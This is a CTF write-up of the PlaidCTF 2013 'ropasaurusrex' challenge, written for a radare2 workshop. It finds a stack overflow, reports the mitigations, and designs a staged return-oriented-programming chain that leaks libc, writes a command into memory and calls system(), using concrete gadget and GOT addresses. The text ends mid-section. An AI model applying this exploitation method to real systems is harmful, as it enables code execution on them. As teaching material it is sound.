This is a detailled writeup of the [Ropsaraurus Rex]() challenge
from PlaidCTF 2013, that was used during the [hack.lu](https://2014.hack.lu)
workshop about [radare2]( http://rada.re ).

I'd like to thank [Eindbazen]( http://eindbazen.net/2013/05/pctf-2013-ropasaurus-pwn-200/ )
and [crowell]() for their help. I'm not a pro at [ROP]( https://en.wikipedia.org/wiki/Return-oriented_programming),
and wanted be sure that I could answer every questions during the workshop.
Every errors are mine, not their.

The goal is not to write as quick as possible a working exploit,
nor to explain what ROP is, but rather to show how radare2 can
be used to craft some cool things.

As always, you should get the latest radare2 version from [git]( https://github.com/radare/radare2 )

```
$ git clone https://github.com/radare/radare2
$ ./sys/install.sh
```

# Preliminary analysis
Open up the ropasaurusrex binary in r2 with the `-A` option, to tell it
to analyse the binary. We can get the list every functions with `afl`.

```
$ r2 -A ./ropasaurusrex
[0x08048340]> afl
0x08048340  34  1  entry0
0x0804831c  6  1  sym.imp.__libc_start_main
0x08048322  10  1  fcn.08048322
0x080482f8  10  1  fcn.080482f8
0x08048302  10  1  fcn.08048302
0x0804830c  6  1  sym.imp.write
0x08048312  10  1  fcn.08048312
0x0804832c  6  1  sym.imp.read
0x08048332  10  1  fcn.08048332
0x0804833c  38  1  fcn.0804833c
0x08048370  85  5  fcn.08048370
0x080483c5  46  4  fcn.080483c5
0x080483f4  41  2  fcn.080483f3
0x0804841d  44  1  main
0x08048450  5  2  fcn.08048449
0x08048455  101  3  fcn.08048455
0x080484ba  4  1  fcn.080484ba
0x080484c0  42  3  fcn.080484c0
0x080484ec  28  2  fcn.080484ea
0x08048508  21  1  section..rodata
[0x08048340]>
```

Not that much, cool. Let's disassemble the main function:

```
[0x08048340]> pdf @ main
│          ; DATA XREF from 0x08048357 (entry0)
╒ (fcn) main 44
│          0x0804841d    55           push ebp
│          0x0804841e    89e5         mov ebp, esp
│          0x08048420    83e4f0       and esp, 0xfffffff0
│          0x08048423    83ec10       sub esp, 0x10
│          0x08048426    e8c9ffffff   call fcn.080483f3
│             fcn.080483f3(unk)
│          0x0804842b    c7442408040. mov dword [esp+0x8], 0x4
│          0x08048433    c7442404108. mov dword [esp+0x4], str.WIN_n ; str.WIN_n
│          0x0804843b    c7042401000. mov dword [esp], 0x1
│          0x08048442    e8c5feffff   call sym.imp.write
│             sym.imp.write()
│          0x08048447    c9           leave
╘          0x08048448    c3           ret
[0x08048340]>
```

The main function is really short, let's translate it into C.

```
int main() {
  fcn.0x80483f4();
  sym.imp.write(stdout, str.WIN_n, 4);  // write is fd, string, len
}
```

So, the main function will call `fcn.0x80483f4()`, then print "WIN" and exit.
```
[0x08048340]> pdf @ fcn.080483f3
           ; CALL XREF from 0x08048426 (unk)
╒ (fcn) fcn.080483f3 41
│          0x080483f4    55           push ebp
│          0x080483f5    89e5         mov ebp, esp
│          0x080483f7    81ec98000000 sub esp, 0x98
│          0x080483fd    c7442408000. mov dword [esp+0x8], 0x100
│          0x08048405    8d8578ffffff lea eax, [ebp-0x88]
│          0x0804840b    89442404     mov [esp+0x4], eax
│          0x0804840f    c7042400000. mov dword [esp], 0x0
│          0x08048416    e811ffffff   call sym.imp.read
│             sym.imp.read(unk)
│          0x0804841b    c9           leave
╘          0x0804841c    c3           ret
[0x08048340]> 
```

Great, this function is also very simple.
Let's reverse it too!

```
sub_0x80483f4() {
  char buf[0x88];
  sym.imp.read(stdin, buffer, 0x100);
}
```

It seems that 0x100 bytes are read, and put in an array of 0x88 elements.
Smells like a classic buffer-overflow.

# Mitigations
Since Aleph One's article
[Smashing The Stack For Fun And Profit]( http://phrack.org/issues/49/14.html#article ),
operating system and compiler have implemented hardening measures to thwart
exploitation, like [ASLR]( https://en.wikipedia.org/wiki/Address_space_layout_randomization )
thanks to [PIC]( https://en.wikipedia.org/wiki/Position-independent_code ),
[NX/W^X/DEP]( https://en.wikipedia.org/wiki/NX_bit ),
[RELRO]( https://isisblogs.poly.edu/2011/06/01/relro-relocation-read-only/ ), ...

`rabin2`, a tool from the radare2 suite, is able to detect those mitigations:
```
$ rabin2 -I ./ropasaurusrex
file	./ropasaurusrex
type	EXEC (Executable file)
pic	false
canary	false
nx	true
crypto	false
has_va	true
root	elf
class	ELF32
lang	c
arch	x86
bits	32
machine	Intel 80386
os	linux
subsys	linux
endian	little
strip	true
static	false
linenum	false
lsyms	false
relocs	false
rpath	NONE
```

We can see that the binary has NX enabled, forcing us to use ROP (surprise!).
But on the bright side, it's not compiled with PIC: it will always
be mapped at the same adress. We can use this to leak some known
function offset and thus, defeating system-wide ASLR!

# Getting control of EIP
We need to see how many bytes we need to throw at this binary
to get control of EIP.

We ported the [De Bruijn](https://en.wikipedia.org/wiki/De_Bruijn_sequence)
pattern generator of [mona.py](http://redmine.corelan.be/projects/mona) to
radare2 (and the ragg2 tool).

Let's generate the pattern:

```
$ ragg2 -P 300 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAZAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABZABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmAB
```

We can now run the binary within r2's debugger, and pass the afermentioned
pattern:

```
$ r2 -d ./ropasaurusrex
Process with PID 21534 started...
PID = 21534
r_debug_select: 21534 21534
pid = 21534 tid = 21534
 [0xf77d80d0]> dc
 AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAZAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABZABYABZABaABbABcABdABeABfABgABhABiABjABkABlABmAB%
 [+] signal 11 aka SIGSEGV received
 [0x41417641]> dr eip
 eip = 0x41417641
 [0x41417641]> woO 0x41417641
 140
 [0x41417641]>
 
```

Ok, we overwrote EIP with the value "0x41417641", which corresponds
to the offset 140; we have to write 140 bytes of padding before our
actual ropchain.

# Thinking the ROP chain
Remember that we have call to *read* and *write* function from libc in our
binary? This provides us a read/write primitive, great!

We're going to write a 3-stage payload:
1. Leak libc address of read(1) (to get the offset of system(2)), and return to the vulnerable function
2. Read our command, and write it *somewhere*
3. Call system(3) on it
4. Actually send our command

There is also a more elegant solution: instead of returning
to the vulnerable function, we could simply stack pivot like this:
1. Leak libc address of read(1)
2. Read our command and write it *somewhere*
3. Stack-pivot
4. Actually send our command

We could also go the *Windows way*:
1. Leak libc address of mprotect(2)
2. Read our shellcode
3. Call mprotect on the previously-written shellcode
4. Return to our shellcode

I'll only detail the first method in this writeup,
but you can find PoC for all of them at the end
of this document.

# Building the chain

If you don't remember the offsets of read(1)/write(1) in PLT, here they are:

```
[0xf77db0d0]> afl~imp.read
0x0804832c  6  1  sym.imp.read
[0xf77db0d0]> afl~imp.write
0x0804830c  6  1  sym.imp.write
```

Now, we must get read's adress in GOT:
```
[0x08048340]> pdi 1 @ sym.imp.read
0x0804832c      ff251c960408  jmp dword [0x804961c]
[0x08048340]>
```

To leak a libc address we'll want to read from the GOT entry of a known libc
function. We can see that read is in the GOT at 0x804961c.
Write is done as such.
```
ssize_t write(int fildes, const void *buf, size_t nbyte);
```
So something like this is what we want.
```
write(1 /*stdout*/, 0x804961c /*read@got*/, 4 /*size to read*/);
```
But then, how do we clean up the stack to go to our next function which is to
write our command? We need to pop 3 items off of the stack, and set the return
address to read. So first, let's find how to pop off the stack.
r2 has some great rop gadget search tools, so we need to find gadgets that do
the following.
```
pop ?
pop ?
pop ?
ret
```
Where `?` can be any register, we don't really care. This cleans up the stack
and gets us to the next return address. We can use the `/R` command for finding
gadgets.
```
[0x08048440]> /R  pop,pop,pop,ret
```
r2 gives us back a bunch of example gadgets. I see one here which looks nice.
```
  0x080484b6           5e  pop esi
  0x080484b7           5f  pop edi
  0x080484b8           5d  pop ebp
  0x080484b9           c3  ret
```
I'll refer to this as "pppr" for poppoppopret.
So, stage 1 of our payload can look like this
```
STAGE 1
--frame_1--
[write@plt]
[pppr     ] // return address
[1        ]
[read@got ]
[4        ]
--frame_2--
[??       ]
```
Next, we need to find a place to write our command string to system.
We can use the read function to do that. Read looks like this
```
ssize_t read(int fd, void *buf, size_t count);```
```
So let's do
```
read(0 /*stdin*/, target, length of command);
```
We now need a place to read the string to. ELF has different sections, with
different permissions. Some are read only, write only, execute only, or any
combination of the three! rabin2 lets us see the secitions and find the
permissions and sizes of each, so we can tell where to write to.
![Imgur](http://i.imgur.com/YsU1Blx.png)
Perfect! there are plenty of sections. Generally I like to write to the `.bss`
section, but this is only size 8, which would limit our command. So let's pick
the `.dynamic` section. It is size 208, and we can write to it.
```
idx=20 vaddr=0x08049530 paddr=0x00000530 sz=208 vsz=208 perm=-rw- name=.dynamic
```
We'll reuse the same pppr gadget, because write has the same number of args.
So now our rop chain can be.
I'll call 0x08049530 writeaddr, and len(cmd) the length of our command.
So this now leaks the libc address of read. Then calls read from stdin to a
memory address that we can write to. Then we need to return to our vulnerable
function to then execute the system address that we calculate.
```
STAGE 1
--frame_1--
[write@plt]
[pppr     ] // return address
[1        ]
[read@got ]
[4        ]
--frame_2--
[vuln_func]

STAGE2
--frame_1--
[read@plt   ]
[pppr       ]
[0          ]
[writeaddr  ]
[len(cmd)+1 ]
```
In my libc, we can find the offsets of read and system. Because we leak the
libc address of read, we can compute where system is by doing the following
math.
```
offset = libc_read - libc_system
sys_addr = leaked_read_addr - offset
```

Let's see what libc we're using
```
$ r2 -d ropasaurusrex
Process with PID 16952 started...
PID = 16952
r_debug_select: 16952 16952
[0xf76fd0d0]> dcu entry0
Continue until 0x08048340
[0x08048340]> dm~libc
[0x08048340]> 
```

```
$ r2 /lib/i386-linux-gnu/libc.so.6
[0x00019be0]> is~name=system
vaddr=0x00057450 paddr=0x00040100 ord=1443 fwd=NONE sz=56 bind=UNKNOWN type=FUNC name=system
[0x00019be0]> is~name=read
vaddr=0x000f2800 paddr=0x000db4b0 ord=950 fwd=NONE sz=125 bind=UNKNOWN type=FUNC name=read
[0x00019be0]>
```

Or, since we're only interested in physical adresses:

```
$ r2 /lib/i386-linux-gnu/libc.so.6
[0x00019be0]> is~name=system[1]
paddr=0x00040100
[0x00019be0]> is~name=read[1]
paddr=0x000db4b0
[0x00019be0]>
`
Now all that is left is to do the same stack smash, then call system.
System looks like this
```
int system(const char *command);
```
So we just want
```
system(0x08049530 /*address of the string we wrote*/);
```
Then were done!
Let's see what our complete payload looks like:
```
STAGE 1
--frame_1--
[write@plt]
[pppr     ] // return address
[1        ]
[read@got ]
[4        ]
--frame_2--
[vuln_func]

STAGE2
--frame_1--
[read@plt   ]
[pppr       ]
[0          ]
[writeaddr  ]
[len(cmd)+1 
--frame_2--
[system   ]
[exit     ]
[writeaddr]

STAGE3
our shell payload
```

# Constructing a more complex ropchain
Let's try something else:
```
$ r2 -d ./ropasaurusrex
Process with PID 32702 started...
PID = 32702
r_debug_select: 32702 32702
pid = 32702 tid = 32702
[0xf77aa0d0]> dc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
[+] signal 11 aka SIGSEGV received
[0x42424242]> dr
eip = 0x42424242
oeax = 0xffffffff
eax = 0x00000091
ebx = 0xf777a000
ecx = 0xffd174b0
edx = 0x00000100
esp = 0xffd17540
ebp = 0x41414141
esi = 0x00000000
edi = 0x00000000
eflags = 0x00010207
[0x42424242]> pxw 12  @ ecx -1
0xffd174af  0x414141f7 0x41414141 0x41414141            .AAAAAAAAAAA    
```
It seems that ecx points to the beginning of our buffer.
